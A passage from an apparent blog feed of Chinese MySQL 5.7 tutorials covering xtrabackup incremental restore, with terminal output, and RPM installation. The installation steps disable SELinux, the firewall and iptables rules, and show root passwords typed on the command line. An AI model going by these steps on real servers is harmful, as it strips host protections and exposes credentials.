class="line">-rw-r----- 1 mysql mysql  1622016 Apr 24 22:26 ibdata1.delta</span><br><span class="line">-rw-r----- 1 mysql mysql       60 Apr 24 22:26 ibdata1.meta</span><br><span class="line">drwxr-x--- 2 mysql mysql     4096 Apr 24 22:26 mysql</span><br><span class="line">drwxr-x--- 2 mysql mysql     8192 Apr 24 22:26 performance_schema</span><br><span class="line">drwxr-x--- 2 mysql mysql     8192 Apr 24 22:26 sys</span><br><span class="line">drwxr-x--- 2 mysql mysql       88 Apr 24 22:26 testbookdb</span><br><span class="line">drwxr-x--- 2 mysql mysql       92 Apr 24 22:26 TESTDB</span><br><span class="line">drwxr-x--- 2 mysql mysql      150 Apr 24 22:26 TESTDB666</span><br><span class="line">-rw-r----- 1 mysql mysql      482 Apr 24 22:26 xtrabackup_info</span><br><span class="line">[root@server12 ~]# systemctl start mysqld</span><br><span class="line">[root@server12 ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.7.20 MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| TESTDB             |</span><br><span class="line">| TESTDB666          |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testbookdb         |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">8 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> BOOK;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| Tables_in_BOOK |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| book           |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book;</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| name                    | price | pages |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| Linux                   |    30 |   666 |</span><br><span class="line">| Cloud Computing         |    60 |   666 |</span><br><span class="line">| Operation System        |    80 |   666 |</span><br><span class="line">| Artificial Intelligence |   166 |   666 |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> TESTDB666;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">| Tables_in_TESTDB666 |</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">| TABLE1              |</span><br><span class="line">| TABLE2              |</span><br><span class="line">+<span class="comment">---------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE1;</span><br><span class="line">ERROR 1146 (42S02): Table &apos;TESTDB666.TABLE1&apos; doesn&apos;t exist</span><br><span class="line">mysql&gt; select * from TABLE2;</span><br><span class="line">ERROR 1146 (42S02): Table &apos;TESTDB666.TABLE2&apos; doesn&apos;t exist</span><br><span class="line">mysql&gt; use TESTDB;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| Tables_in_TESTDB |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| TABLE1           |</span><br><span class="line">| TABLE2           |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE1;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">|       6 | MySQL3 |    73 | QH         |</span><br><span class="line">|       7 | MySQL4 |    74 | QH         |</span><br><span class="line">|       8 | MySQL5 |    75 | QH         |</span><br><span class="line">|       9 | MySQL6 |    76 | QH         |</span><br><span class="line">|      10 | MySQL7 |    77 | QH         |</span><br><span class="line">|      11 | MySQL8 |    78 | QH         |</span><br><span class="line">|      12 | MySQL9 |    79 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">12 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE2;</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">| name   | price | pages |</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">| Linux  |    30 |   666 |</span><br><span class="line">| CLD    |    60 |   666 |</span><br><span class="line">| SYS    |    80 |   666 |</span><br><span class="line">| MySQL1 |   166 |   666 |</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">[root@server12 ~]#</span><br><span class="line"></span><br><span class="line">[root@server12 ~]# ll /mysql-all-data/</span><br><span class="line">total 110632</span><br><span class="line">-rw-r----- 1 mysql mysql       56 Apr 23 05:15 auto.cnf</span><br><span class="line">drwxr-x--- 2 mysql mysql       88 Apr 24 21:26 BOOK</span><br><span class="line">-rw-r----- 1 mysql mysql      343 Apr 24 21:51 ib_buffer_pool</span><br><span class="line">-rw-r----- 1 mysql mysql 12582912 Apr 24 21:51 ibdata1</span><br><span class="line">-rw-r----- 1 mysql mysql 50331648 Apr 24 21:51 ib_logfile0</span><br><span class="line">-rw-r----- 1 mysql mysql 50331648 Apr 23 05:15 ib_logfile1</span><br><span class="line">drwxr-x--- 2 mysql mysql     4096 Apr 23 05:14 mysql</span><br><span class="line">drwxr-x--- 2 mysql mysql     8192 Apr 23 05:14 performance_schema</span><br><span class="line">drwxr-x--- 2 mysql mysql     8192 Apr 23 05:14 sys</span><br><span class="line">drwxr-x--- 2 mysql mysql       88 Apr 23 05:14 testbookdb</span><br><span class="line">drwxr-x--- 2 mysql mysql       92 Apr 24 21:28 TESTDB</span><br><span class="line">-rw-r----- 1 mysql mysql      472 Apr 23 05:14 xtrabackup_info</span><br><span class="line">[root@server12 ~]# systemctl stop mysqld</span><br><span class="line">[root@server12 ~]# rm -rf /var/lib/mysql/*</span><br><span class="line">[root@server12 ~]# mv /mysql-all-data/* /var/lib/mysql</span><br><span class="line">[root@server12 ~]# ll /var/lib/mysql</span><br><span class="line">total 110632</span><br><span class="line">-rw-r----- 1 mysql mysql       56 Apr 23 05:15 auto.cnf</span><br><span class="line">drwxr-x--- 2 mysql mysql       88 Apr 24 21:26 BOOK</span><br><span class="line">-rw-r----- 1 mysql mysql      343 Apr 24 21:51 ib_buffer_pool</span><br><span class="line">-rw-r----- 1 mysql mysql 12582912 Apr 24 21:51 ibdata1</span><br><span class="line">-rw-r----- 1 mysql mysql 50331648 Apr 24 21:51 ib_logfile0</span><br><span class="line">-rw-r----- 1 mysql mysql 50331648 Apr 23 05:15 ib_logfile1</span><br><span class="line">drwxr-x--- 2 mysql mysql     4096 Apr 23 05:14 mysql</span><br><span class="line">drwxr-x--- 2 mysql mysql     8192 Apr 23 05:14 performance_schema</span><br><span class="line">drwxr-x--- 2 mysql mysql     8192 Apr 23 05:14 sys</span><br><span class="line">drwxr-x--- 2 mysql mysql       88 Apr 23 05:14 testbookdb</span><br><span class="line">drwxr-x--- 2 mysql mysql       92 Apr 24 21:28 TESTDB</span><br><span class="line">-rw-r----- 1 mysql mysql      472 Apr 23 05:14 xtrabackup_info</span><br><span class="line">[root@server12 ~]# systemctl start mysqld</span><br><span class="line">[root@server12 ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.7.20 MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| TESTDB             |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testbookdb         |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">7 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> BOOK;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| Tables_in_BOOK |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">| book           |</span><br><span class="line">+<span class="comment">----------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book;</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| name                    | price | pages |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| Linux                   |    30 |   666 |</span><br><span class="line">| Cloud Computing         |    60 |   666 |</span><br><span class="line">| Operation System        |    80 |   666 |</span><br><span class="line">| Artificial Intelligence |   166 |   666 |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> TESTDB;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| Tables_in_TESTDB |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| TABLE1           |</span><br><span class="line">| TABLE2           |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE1;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">|       6 | MySQL3 |    73 | QH         |</span><br><span class="line">|       7 | MySQL4 |    74 | QH         |</span><br><span class="line">|       8 | MySQL5 |    75 | QH         |</span><br><span class="line">|       9 | MySQL6 |    76 | QH         |</span><br><span class="line">|      10 | MySQL7 |    77 | QH         |</span><br><span class="line">|      11 | MySQL8 |    78 | QH         |</span><br><span class="line">|      12 | MySQL9 |    79 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">12 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE2;</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">| name   | price | pages |</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">| Linux  |    30 |   666 |</span><br><span class="line">| CLD    |    60 |   666 |</span><br><span class="line">| SYS    |    80 |   666 |</span><br><span class="line">| MySQL1 |   166 |   666 |</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br><span class="line">[root@server12 ~]<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>&#x7531;&#x4EE5;&#x4E0A;&#x64CD;&#x4F5C;&#x53EF;&#x77E5;innobackupex&#x8FD8;&#x539F;&#x589E;&#x91CF;&#x6570;&#x636E;&#x4E0D;&#x7A33;&#x5B9A;&#xFF01;</p><p>6&#xFF1A;&#x5B98;&#x65B9;&#x6587;&#x6863;<br><a href="https://www.percona.com/doc/percona-xtrabackup/2.4/index.html" target="_blank" rel="noopener">https://www.percona.com/doc/percona-xtrabackup/2.4/index.html</a></p><p>&#x6587;&#x6863;&#xFF1A;10 mysqldump&#x8FDC;&#x7A0B;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x6570;&#x636E;.md<br>&#x94FE;&#x63A5;&#xFF1A;<a href="http://note.youdao.com/noteshare?id=7af3e7cda297defe01228ed798e72c02&amp;sub=E2F44DF8E1BC4B9287EA434DEA3B670C" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=7af3e7cda297defe01228ed798e72c02&amp;sub=E2F44DF8E1BC4B9287EA434DEA3B670C</a></p><p>&#x6587;&#x6863;&#xFF1A;16 innobackupex&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x9047;&#x5230;Can&#x2019;&#x2026;<br>&#x94FE;&#x63A5;&#xFF1A;<a href="http://note.youdao.com/noteshare?id=75c497bba7496b9ec1c61c766e03cca8&amp;sub=F4A9B0EB5E554DB5BB6EF40A12A25512" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=75c497bba7496b9ec1c61c766e03cca8&amp;sub=F4A9B0EB5E554DB5BB6EF40A12A25512</a></p><p>&#x7EC3;&#x4E60;&#xFF1A;1. &#x628A;&#x6570;&#x636E;&#x5B57;&#x5178;&#x5BFC;&#x5165;MySQL&#x6570;&#x636E;&#x5E93; 2. MySQL5.7.20&#x5728;&#x7EBF;&#x5347;&#x7EA7;&#x5230;MySQL5.7.24</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;&amp;#x4E00;&amp;#xFF1A;MySQL&amp;#x5B57;&amp;#x7B26;&amp;#x96C6;&quot;&gt;&lt;a href=&quot;#&amp;#x4E00;&amp;#xFF1A;MySQL&amp;#x5B57;&amp;#x7B26;&amp;#x96C6;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用RPM包安装MySQL5.7数据库</title>
    <link href="https://marnm.github.io//posts/f6e2d114/"/>
    <id>https://marnm.github.io//posts/f6e2d114/</id>
    <published>2022-06-07T04:44:03.000Z</published>
    <updated>2022-06-07T05:14:33.480Z</updated>
    
    <content type="html"><![CDATA[<p>&#x4F7F;&#x7528;rpm&#x5305;&#x5B89;&#x88C5;MySQL5.7&#x6570;&#x636E;&#x5E93;</p><ol><li>&#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;  </li></ol><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/null</span><br><span class="line">setenforce 0</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">iptables -F</span><br><span class="line">systemctl stop NetworkManager &amp;&gt; /dev/null</span><br><span class="line">systemctl disable NetworkManager &amp;&gt; /dev/null</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li><p>&#x4E0A;&#x4F20;mysql&#x5B89;&#x88C5;&#x5305;</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf mysql5.7.tar.gz</span><br><span class="line">cd mysql/</span><br></pre></td></tr></tbody></table></figure></li><li><p>&#x5B89;&#x88C5;  </p><p>rpm -e &#x2013;nodeps mariadb-libs &#x2014;&#x2013;&#x5378;&#x8F7D;&#x673A;&#x5668;&#x4E2D;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;mariadb-libs&#x6570;&#x636E;&#x5E93;&#x5305;</p><p>rpm -ivh mysql-community-common-5.7.24-1.el7.x86_64.rpm<br>rpm -ivh mysql-community-libs-5.7.24-1.el7.x86_64.rpm<br>rpm -ivh mysql-community-client-5.7.24-1.el7.x86_64.rpm<br>rpm -ivh mysql-community-devel-5.7.24-1.el7.x86_64.rpm<br>rpm -ivh mysql-community-server-5.7.24-1.el7.x86_64.rpm  </p></li><li><p>&#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;<br>vim /etc/my.cnf &#x2014;&#x2013;&#x7F16;&#x8F91;myslq&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5728;&#x672B;&#x5C3E;&#x589E;&#x52A0;&#x4E00;&#x4E0B;&#x8BED;&#x53E5;&#x4F18;&#x5316;&#x8FDE;&#x63A5;<br>&#x8DF3;&#x8FC7;&#x4E3B;&#x673A;&#x540D;&#x89E3;&#x6790;&#xFF0C;&#x63D0;&#x9AD8;&#x8FDE;&#x63A5;&#x901F;&#x5EA6;  </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skip-name-resolve</span><br><span class="line">echo skip-name-resolve &gt;&gt; /etc/my.cnf</span><br></pre></td></tr></tbody></table></figure></li></ol><p>&#x542F;&#x52A8;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;</p><pre><code>systemctl start mysqldsystemctl status mysqldsystemctl enable mysqld</code></pre><p>&#x83B7;&#x53D6;&#x968F;&#x673A;&#x7684;&#x521D;&#x59CB;&#x5BC6;&#x7801; (mysql5.7&#x5F00;&#x59CB;&#x7B2C;&#x4E00;&#x6B21;&#x4EA7;&#x751F;&#x968F;&#x673A;&#x5BC6;&#x7801;&#xFF0C;&#x4E14;&#x767B;&#x5F55;&#x540E;&#x5FC5;&#x987B;&#x4FEE;&#x6539;&#xFF0C;&#x5426;&#x5219;&#x65E0;&#x6CD5;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;)<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/mysqld.log | grep &quot;password&quot;</span><br><span class="line">2021-01-09T07:10:18.431779Z 1 [Note] A temporary password is generated for root@localhost: -dhfHuf%p9hq</span><br><span class="line"></span><br><span class="line">netstat -nlpt | grep mysqld -----mysqld &#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;3306</span><br><span class="line">tcp6 0 0 :::3306 :::* LISTEN 4434/mysqld</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x901A;&#x8FC7;mysql&#x547D;&lt;&#x5BA2;&#x6237;&#x7AEF;&gt;&#x767B;&#x5F55; mysqld&#x670D;&#x52A1;&#x5668;<br>mysql -u &lt;&#x7528;&#x6237;&#x540D;&gt; -p &lt;&#x5BC6;&#x7801;&gt; -h &lt;&#x6307;&#x5B9A;&#x670D;&#x52A1;&#x5668;IP,&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&gt; -P &lt;&#x7AEF;&#x53E3;,&#x9ED8;&#x8BA4;3306&gt;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">Enter password:</span><br><span class="line">mysql&gt;  &#x8F93;&#x5165;sql&#x8BED;&#x53E5;&#x4E0E;mysqld&#x4EA4;&#x4E92;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4FEE;&#x6539;&#x521D;&#x59CB;&#x5BC6;&#x7801;&#xFF0C;&lt;&#x5BC6;&#x7801;&#x9700;&#x8981;&#x590D;&#x6742;&#x7684;&#x5BC6;&#x7801;&gt;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER USER &apos;root&apos;@&apos;localhost&apos; identified by &quot;Uplooking_123&quot;;</span><br><span class="line">mysql&gt; flush privileges; ----&#x5237;&#x65B0;&#x6743;&#x9650;&#xFF0C;&#x7ACB;&#x5373;&#x751F;&#x6548;</span><br><span class="line">mysql&gt; quit</span><br></pre></td></tr></tbody></table></figure><p></p><p>rpm&#x5B89;&#x88C5;MySQL5.7&#x914D;&#x7F6E;&#x591A;&#x5B9E;&#x4F8B;<br>&#x94FE;&#x63A5;&#xFF1A;<a 